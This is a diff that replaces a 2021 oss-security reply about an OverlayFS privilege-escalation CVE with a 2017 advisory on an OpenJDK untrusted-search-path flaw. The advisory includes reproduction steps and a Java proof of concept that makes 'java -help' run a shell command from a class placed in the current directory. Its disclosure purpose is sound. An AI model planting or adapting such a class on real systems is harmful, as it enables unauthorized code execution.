@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1212" "Monday" "18" "October" "2021" "17:52:51" "+0000" "halfdog" "me@halfdog.net" nil "40" "Re: [oss-security] CVE-2021-3847: OverlayFS - Potential Privilege Escalation using overlays copy_up" nil nil nil "10" nil nil (number mark "U       me@halfdog.n Oct 18   40/1212  " thread-indent "\"Re: [oss-security] CVE-2021-3847: OverlayFS - Potential Privilege Escalation using overlays copy_up\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] CVE-2021-3847: OverlayFS - Potential Privilege Escalation using overlays copy_up" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1769" "Tuesday" "13" "June" "2017" "17:23:13" "+0200" "Jakub Wilk" "jwilk@jwilk.net" "<20170613152313.te53ju5sh77ptnix@jwilk.net>" "62" "[oss-security] OpenJDK: java(1): untrusted search path" "^Date:" nil nil "6" "2017061315:23:13" "[oss-security] OpenJDK: java(1): untrusted search path" (number mark "        jwilk@jwilk. Jun 13   62/1769  " thread-indent "\"[oss-security] OpenJDK: java(1): untrusted search path\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 30223 invoked by uid 550); 18 Oct 2021 17:53:25 -0000
+Received: (qmail 32080 invoked by uid 550); 13 Jun 2017 15:23:28 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,58 +11,82 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 30202 invoked from network); 18 Oct 2021 17:53:24 -0000
-From: halfdog <me@halfdog.net>
-To: Alon Zahavi <Alon.Zahavi@cyberark.com>
-cc: oss-security@lists.openwall.com
-In-reply-to: <PAXP193MB1405A3EC41713BE9D524FBE48DB89@PAXP193MB1405.EURP193.PROD.OUTLOOK.COM>
-References: <DB9P193MB140461EEF44F153D9F66FF958DB89@DB9P193MB1404.EURP193.PROD.OUTLOOK.COM> <PAXP193MB1405A3EC41713BE9D524FBE48DB89@PAXP193MB1405.EURP193.PROD.OUTLOOK.COM>
-Comments: In-reply-to Alon Zahavi <Alon.Zahavi@cyberark.com>
-   message dated "Thu, 14 Oct 2021 18:30:53 +0000."
+Received: (qmail 32048 invoked from network); 13 Jun 2017 15:23:27 -0000
+Message-ID: <20170613152313.te53ju5sh77ptnix@jwilk.net>
+Mail-Followup-To: oss-security@lists.openwall.com
 MIME-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Date: Mon, 18 Oct 2021 17:52:51 +0000
-Message-ID: <4095-1634579571.798266@3V_h.d15S.uAgJ>
-Subject: Re: [oss-security] CVE-2021-3847: OverlayFS - Potential Privilege Escalation using overlays copy_up
+Content-Type: multipart/mixed; boundary="5fidj6dfbx3miiuh"
+Content-Disposition: inline
+User-Agent: NeoMutt/20170306 (1.8.0)
+X-Ovh-Tracer-Id: 244038808147187622
+X-VR-SPAMSTATE: OK
+X-VR-SPAMSCORE: 0
+X-VR-SPAMCAUSE: gggruggvucftvghtrhhoucdtuddrfeeljedrjeefgdeltdcutefuodetggdotefrodftvfcurfhrohhfihhlvgemucfqggfjpdevjffgvefmvefgnecuuegrihhlohhuthemuceftddtnecu
+Date: Tue, 13 Jun 2017 17:23:13 +0200
+From: Jakub Wilk <jwilk@jwilk.net>
+Reply-To: oss-security@lists.openwall.com
+Subject: [oss-security] OpenJDK: java(1): untrusted search path
+To: oss-security@lists.openwall.com
 
-Alon Zahavi writes:
->
-> After disclosing the issue with the linux-distros mailing list,
-> I am reporting the security issue publicly to here. There is
-> no patch available and may not be available for a long time
-> because the kernel can't enforce the mitigation proposed, as
-> that would be a layering violation and could also possibly
-> cause a regression. This vulnerability was attached with
-> CVE-2021-3847. Here is the report that was initially sent:
-> ...
+--5fidj6dfbx3miiuh
+Content-Type: text/plain; charset=us-ascii; format=flowed
+Content-Disposition: inline
 
-Just funny, just hours before this mail I got 3 mails on different
-overlayfs copy-up vuln, e.g.
+Running "java -help" can load code from a subdirectory of cwd:
 
-"""
-The Precise Pangolin has reached end of life, so this bug will not be
-fixed for that release
+    $ javac launcher_en.java
+    $ mkdir -p sun/launcher/resources/
+    $ mv launcher_en.class sun/launcher/resources/
+    $ java -help
+     _______
+    < pwned >
+     -------
+            \   ^__^
+             \  (oo)\_______
+                (__)\       )\/\
+                    ||----w |
+                    ||     ||
 
-** Changed in: linux (Ubuntu Precise)
-       Status: New => Won't Fix
+This happens because:
+
+* By default (i.e. when CLASSPATH env var was unset and neither -cp nor -jar 
+was specified), java sets "." as the user class path:
+https://docs.oracle.com/javase/8/docs/technotes/tools/findingclasses.html#userclass
+
+* The help message is apparently supposed to be internationalized.
+
+* The Java's localization machinery loads classes:
+https://docs.oracle.com/javase/8/docs/api/java/util/ResourceBundle.html
+
+
+On Debian systems, jarwrapper (a binfmt-misc thing for running executable jar 
+files) is affected. It contains the following code:
+
+    if java -d32 2>&1 | grep "does not support" > /dev/null; then
+    ...
+
+On 32-bit systems, this causes java to print the help message.
 
 -- 
-You received this bug notification because you are subscribed to the bug
-report.
-https://bugs.launchpad.net/bugs/1534961
-"""
-...
+Jakub Wilk
 
-[Bug 1534961] Re: CVE-2016-1575
-[Bug 1547400] Re: CVE-2016-2853
-[Bug 1535150] Re: CVE-2016-1576
+--5fidj6dfbx3miiuh
+Content-Type: text/x-java; charset=us-ascii
+Content-Disposition: attachment; filename="launcher_en.java"
 
-So it is 5 years and not so much changed :-)
+package sun.launcher.resources;
+import java.util.*;
+public class launcher_en extends ListResourceBundle {
+    public Object[][] getContents() {
+        ProcessBuilder pb = new ProcessBuilder("sh", "-c", "cowsay pwned >/dev/tty");
+        try {
+            pb.start();
+        } catch (Exception ex) {
+            ex.printStackTrace();
+        }
+        Runtime.getRuntime().exit(1);
+        return null;
+    }
+}
 
-Overlayfs and alike where lower privileged user can simultaneously
-access lower/upper AND the mounted file system is extremely dangerous
-and prone to so many vulns, that nobody should use/allow that.
-
-hd
-
+--5fidj6dfbx3miiuh--
